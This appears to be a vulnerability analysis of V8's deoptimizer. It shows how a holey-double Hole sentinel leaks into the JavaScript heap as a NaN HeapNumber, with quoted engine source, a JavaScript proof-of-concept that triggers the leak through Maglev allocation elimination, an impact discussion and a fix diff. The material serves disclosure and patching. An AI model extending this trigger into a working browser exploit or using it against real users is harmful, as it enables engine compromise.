# Vulnerability Analysis: V8 Sandbox Heap Manipulation via Deoptimization Hole Leak

## 1. Executive Summary
A critical vulnerability exists in the V8 Deoptimizer when materializing `HoleyFloat64` values originating from the Maglev optimizing compiler. Specifically, the method `TranslatedState::GetValue()` fails to check for the internal "The Hole" sentinel value before boxing a double into a `HeapNumber`. This violation of the "Holey Float" contract allows the internal "Hole" bit pattern to leak into the JavaScript heap as a visible `NaN`, leading to potential type confusion and logic bypasses within the V8 sandbox.

## 2. Technical Verification & Root Cause

The vulnerability is confirmed by analyzing three interacting components: the definition of `Float64`, the `NewHeapNumber` factory, and the Deoptimizer's materialization logic.

### 2.1 `Float64::is_hole_nan` Exists (`src/utils/boxed-float.h`)
The `Float64` wrapper class correctly identifies the hole sentinel. `Float64` uses `base::bit_cast` to read/write scalar doubles, which preserves the bit pattern on standard architectures (like x64/arm64) used by V8.

```cpp
// src/utils/boxed-float.h
class Float64 {
 public:
  // ...
  static constexpr Float64 hole_nan() {
    return Float64::FromBits(kHoleNanInt64);
  }
  // ...
  bool is_hole_nan() const { return bit_pattern_ == kHoleNanInt64; }

  // Returns the double value. If this is a Hole NaN, it returns the NaN.
  // bit_cast ensures the bit pattern is preserved during the cast.
  double get_scalar() const { return base::bit_cast<double>(bit_pattern_); }
  // ...
};
```

### 2.2 `NewHeapNumber` Lacks Mitigation (`src/heap/factory-base-inl.h`)
The factory method used to create HeapNumbers blindly wraps the provided double value. It contains no sanitization logic to convert the "Hole NaN" to `undefined`.

```cpp
// src/heap/factory-base-inl.h
template <typename Impl>
template <AllocationType allocation>
Handle<HeapNumber> FactoryBase<Impl>::NewHeapNumber(double value) {
  Handle<HeapNumber> heap_number = NewHeapNumber<allocation>();
  // [VULNERABILITY] Directly writes the bits, including the Hole NaN pattern.
  // heap_number->set_value(value) ultimately writes the double bits to the heap.
  heap_number->set_value(value);
  return heap_number;
}
```

### 2.3 The Discrepancy in `src/deoptimizer/translated-state.cc`

The core issue is the inconsistency between `GetRawValue` (safe) and `GetValue` (unsafe).

**Safe Path (`GetRawValue`):** used for stack/register reconstruction.
```cpp
Tagged<Object> TranslatedValue::GetRawValue() const {
  // ...
  switch (kind()) {
    case kHoleyDouble:
      if (double_value().is_hole_nan()) { // [CHECK EXISTS]
        return ReadOnlyRoots(isolate()).undefined_value();
      }
      [[fallthrough]];
    case kDouble:
      // ...
  }
}
```

**Vulnerable Path (`GetValue`):** used for object materialization.
```cpp
Handle<Object> TranslatedValue::GetValue() {
  // ...
  double number = 0;
  Handle<HeapObject> heap_object;
  switch (kind()) {
    // ...
    case TranslatedValue::kDouble:
    // [FALSE ASSUMPTION] The comment assumes holes are handled, but Maglev
    // uses kHoleyDouble for values that CAN be holes.
    // "We shouldn't have hole values by now, so treat holey double as normal doubles."
    case TranslatedValue::kHoleyDouble:
      // [BUG] double_value().get_scalar() returns the raw double, potentially the Hole NaN.
      number = double_value().get_scalar();

      // [BUG] Missing `if (double_value().is_hole_nan()) ...`
      // This passes the Hole NaN to NewHeapNumber, creating a HeapNumber(HoleNaN).
      heap_object = isolate()->factory()->NewHeapNumber(number);
      break;
    // ...
  }
  set_initialized_storage(heap_object);
  return storage_;
}
```

## 3. Exploit Scenario (Detailed Example)

**Objective**: Force the deoptimizer to call `GetValue()` on a `HoleyFloat64` that contains the hole, leaking it as a `NaN`.

**Mechanism**: We use Maglev's **Allocation Elimination**. When Maglev eliminates an object allocation, it stores the object's fields in virtual slots. If a field contains a holey double, it is stored as `kHoleyDouble` in the deoptimization data. When we deoptimize, `TranslatedState::InitializeJSObjectAt` calls `GetValue` to reconstruct the object, triggering the bug.

```javascript
// 1. Setup: Create an array with a hole (HoleyFloat64).
//    V8 represents the hole as a specific quiet NaN (kHoleNanInt64).
const holeyArray = [1.1, 2.2, /* hole */, 4.4];

function trigger(arr, index, forceDeopt) {
  // 2. Load the value.
  //    Maglev compiles this load. Since the array is holey double,
  //    'val' is tracked as a HoleyFloat64.
  const val = arr[index];

  // 3. Virtual Object Allocation (Allocation Elimination).
  //    We create a temporary object. Maglev sees it doesn't escape
  //    (until the deopt point), so it optimizes it away.
  //    It records 'val' as a field of this virtual object in the
  //    translation frame.
  const wrapper = { value: val };

  // 4. Deoptimization Trigger.
  if (forceDeopt) {
    //    We force a deopt here. The Deoptimizer must now:
    //    a. Reconstruct the stack frame.
    //    b. Materialize the 'wrapper' object (because it conceptually exists).
    //    c. To materialize 'wrapper', it calls GetValue() for 'wrapper.value'.
    %DeoptimizeNow();
  }

  return wrapper.value;
}

// Warmup Maglev
for (let i = 0; i < 20000; i++) {
  trigger(holeyArray, 0, false);
}

// 5. Trigger the leak.
//    Index 2 is the hole.
//    Maglev passes the Hole sentinel to the Deoptimizer.
//    Deopt calls GetValue(), creating a HeapNumber(HoleNaN).
const leaked = trigger(holeyArray, 2, true);

// 6. Verification
if (leaked === undefined) {
  console.log("Safe: Correctly converted to undefined.");
} else if (Number.isNaN(leaked)) {
  // In a safe engine, this branch is unreachable for a hole load
  // (which normally returns undefined).
  // But here, we get a HeapNumber that is NaN.
  console.log("VULNERABLE: Leaked Hole sentinel as NaN!");

  // Note on get_scalar():
  // Even though it returns a NaN double, the specific bit pattern of
  // the Hole is preserved and wrapped in the HeapNumber.
}
```

## 4. Impact Analysis

*   **Sandbox Violation**: This bug allows constructing a `HeapNumber` with a value that should never exist on the JS heap (the Hole sentinel).
*   **Logic Bypass**: `undefined` checks (common in optional property access) will fail.
*   **Type Confusion**: While "The Hole" is technically a `NaN` double, V8 internals treat it as a special sentinel. Leaking it allows JavaScript to hold a reference to a sentinel value, which could be used to confuse other JIT phases if passed back into optimized code.

## 5. Proposed Fix

Apply the check from `GetRawValue` to `GetValue`.

**File**: `src/deoptimizer/translated-state.cc`

```diff
     case TranslatedValue::kHoleyDouble:
+      if (double_value().is_hole_nan()) {
+        return isolate()->factory()->undefined_value();
+      }
+      [[fallthrough]];
     case TranslatedValue::kDouble:
-    // We shouldn't have hole values by now, so treat holey double as normal
-    // doubles.
-    case TranslatedValue::kHoleyDouble:
       number = double_value().get_scalar();
       heap_object = isolate()->factory()->NewHeapNumber(number);
       break;
```
